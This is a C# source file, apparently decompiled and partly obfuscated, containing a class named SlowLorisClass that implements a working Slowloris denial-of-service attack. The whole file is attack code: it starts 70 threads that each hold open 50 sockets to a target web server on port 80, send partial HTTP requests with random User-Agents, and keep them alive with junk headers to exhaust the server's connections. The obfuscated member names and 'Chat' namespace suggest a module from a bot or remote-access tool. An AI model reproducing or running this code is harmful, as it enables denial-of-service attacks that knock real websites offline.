namespace Chat
{
    using Microsoft.VisualBasic;
    using Microsoft.VisualBasic.CompilerServices;
    using System;
    using System.Collections.Generic;
    using System.Diagnostics;
    using System.Net;
    using System.Net.Sockets;
    using System.Runtime.CompilerServices;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Threading;
    using System.Windows.Forms;

    public class SlowLorisClass
    {
        private static List<WeakReference> __ENCList = new List<WeakReference>();
        [AccessedThroughProperty("Timer")]
        private System.Windows.Forms.Timer _Timer;
        private bool AttackStatus;
        private string pQuVXJTE981DB3uiXPHgtqWkSJ47oJdC;
        public static List<Thread> ThreadList = new List<Thread>();
        public int ThreadSocket;
        public int TotalThreadOpen;
        public string UrlAttack;
        private Random WoXJ8Qu1wrWBAaKLhDLnoqbsriGefYjJ;

        public SlowLorisClass()
        {
            __ENCAddToList(this);
            this.UrlAttack = "";
            this.TotalThreadOpen = 50;
            this.ThreadSocket = 70;
            this.AttackStatus = true;
            this.Timer = new System.Windows.Forms.Timer();
            this.WoXJ8Qu1wrWBAaKLhDLnoqbsriGefYjJ = new Random(Environment.TickCount);
        }

        [DebuggerNonUserCode]
        private static void __ENCAddToList(object value)
        {
            List<WeakReference> list = __ENCList;
            lock (list)
            {
                if (__ENCList.Count == __ENCList.Capacity)
                {
                    int index = 0;
                    int num3 = __ENCList.Count - 1;
                    for (int i = 0; i <= num3; i++)
                    {
                        WeakReference reference = __ENCList[i];
                        if (reference.IsAlive)
                        {
                            if (i != index)
                            {
                                __ENCList[index] = __ENCList[i];
                            }
                            index++;
                        }
                    }
                    __ENCList.RemoveRange(index, __ENCList.Count - index);
                    __ENCList.Capacity = __ENCList.Count;
                }
                __ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
            }
        }

        private void Attack()
        {
            Socket[] socketArray = new Socket[(this.TotalThreadOpen - 1) + 1];
            Uri uri = new Uri(this.UrlAttack);
            int num5 = this.TotalThreadOpen - 1;
            for (int i = 0; i <= num5; i++)
            {
                if (!this.AttackStatus)
                {
                    goto Label_02C2;
                }
                socketArray[i] = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            }
            while (true)
            {
                if (!this.AttackStatus)
                {
                    break;
                }
                int num6 = this.TotalThreadOpen - 1;
                for (int j = 0; j <= num6; j++)
                {
                    if (!this.AttackStatus)
                    {
                        break;
                    }
                    if (socketArray[j].Connected)
                    {
                        goto Label_01D1;
                    }
                Label_00AF:
                    if (!this.AttackStatus)
                    {
                        break;
                    }
                    try
                    {
                        socketArray[j] = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        socketArray[j].Connect(Dns.GetHostAddresses(uri.Host)[0], 80);
                        socketArray[j].Send(Encoding.ASCII.GetBytes("GET " + uri.PathAndQuery + " HTTP/1.1\r\nHost: " + uri.Host + "\r\nUser-Agent: " + this.pQuVXJTE981DB3uiXPHgtqWkSJ47oJdC + " (config: per_thread=" + Conversions.ToString(this.TotalThreadOpen) + "; aotv2=" + Conversions.ToString(this.ThreadSocket) + ";)\r\n"), SocketFlags.None);
                    }
                    catch (Exception exception1)
                    {
                        ProjectData.SetProjectError(exception1);
                        Exception exception = exception1;
                        if (!this.AttackStatus)
                        {
                            ProjectData.ClearProjectError();
                            break;
                        }
                        Thread.Sleep(0x3e8);
                        ProjectData.ClearProjectError();
                        goto Label_00AF;
                        ProjectData.ClearProjectError();
                    }
                Label_01D1:
                    if (!this.AttackStatus)
                    {
                        break;
                    }
                }
                if (!this.AttackStatus)
                {
                    break;
                }
                do
                {
                    if (!this.AttackStatus)
                    {
                        break;
                    }
                    try
                    {
                        int num7 = this.TotalThreadOpen - 1;
                        for (int k = 0; k <= num7; k++)
                        {
                            if (!this.AttackStatus)
                            {
                                break;
                            }
                            socketArray[k].Send(Encoding.ASCII.GetBytes("X-" + this.lme1LmY0vfI0FOiZyF4KPFB6gO80V5Wb(10) + ": 1\r\n"), SocketFlags.None);
                        }
                    }
                    catch (Exception exception2)
                    {
                        ProjectData.SetProjectError(exception2);
                        ProjectData.ClearProjectError();
                    }
                    Thread.Sleep(0xfa0);
                }
                while (this.AttackStatus);
            }
        Label_02C2:;
            try
            {
                int num8 = this.TotalThreadOpen - 1;
                for (int m = 0; m <= num8; m++)
                {
                    if (socketArray[m].Connected)
                    {
                        socketArray[m].Disconnect(false);
                    }
                    socketArray[m] = null;
                }
            }
            catch (Exception exception3)
            {
                ProjectData.SetProjectError(exception3);
                ProjectData.ClearProjectError();
            }
        }

        private void GZj2WaSCdgL28tduEgYbMuuaWfZyRJLy(object jluFU5EdOwbos8ruG22xKZW3XZdPV4CP, EventArgs ImeaQv2oxfjfXkDt8CYqyh0jV0mxwem5)
        {
            this.pQuVXJTE981DB3uiXPHgtqWkSJ47oJdC = this.vMXFSQfFDrQEePRSb2Yl6edVxzcplo6b(0x10, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789");
        }

        public string lme1LmY0vfI0FOiZyF4KPFB6gO80V5Wb(int HxTy0gRODBsM61mfdeRR55pMOX6mA05s)
        {
            string str2 = "";
            int num2 = HxTy0gRODBsM61mfdeRR55pMOX6mA05s - 1;
            for (int i = 0; i <= num2; i++)
            {
                str2 = Conversions.ToString((double) (Conversions.ToDouble(str2) + this.WoXJ8Qu1wrWBAaKLhDLnoqbsriGefYjJ.Next(9)));
            }
            return str2;
        }

        public void StartAttack()
        {
            try
            {
                this.Timer.Start();
                this.AttackStatus = true;
                int num2 = this.ThreadSocket - 1;
                for (int i = 0; i <= num2; i++)
                {
                    ThreadList.Add(new Thread(new ThreadStart(this.Attack)));
                    ThreadList[ThreadList.Count - 1].Start();
                }
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        public void StopAllThread()
        {
            this.Timer.Stop();
            this.AttackStatus = false;
            ThreadList.Clear();
            foreach (Thread thread in ThreadList)
            {
                if (thread.ThreadState != ThreadState.Stopped)
                {
                    break;
                }
            }
        }

        public string vMXFSQfFDrQEePRSb2Yl6edVxzcplo6b(int FqVi3zK6rAXVOoPIYvPFOICtQS0SujSv, [Optional, DefaultParameterValue("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")] string DataSend)
        {
            VBMath.Randomize();
            char[] chArray = DataSend.ToCharArray();
            StringBuilder builder = new StringBuilder();
            Random random = new Random();
            while (Strings.Len(builder.ToString()) != FqVi3zK6rAXVOoPIYvPFOICtQS0SujSv)
            {
                int index = (int) Math.Round((double) (VBMath.Rnd() * (chArray.Length - 1)));
                builder.Append(chArray[index]);
            }
            return builder.ToString();
        }

        private System.Windows.Forms.Timer Timer
        {
            [DebuggerNonUserCode]
            get
            {
                return this._Timer;
            }
            [MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode]
            set
            {
                EventHandler handler = new EventHandler(this.GZj2WaSCdgL28tduEgYbMuuaWfZyRJLy);
                if (this._Timer != null)
                {
                    this._Timer.Tick -= handler;
                }
                this._Timer = value;
                if (this._Timer != null)
                {
                    this._Timer.Tick += handler;
                }
            }
        }
    }
}

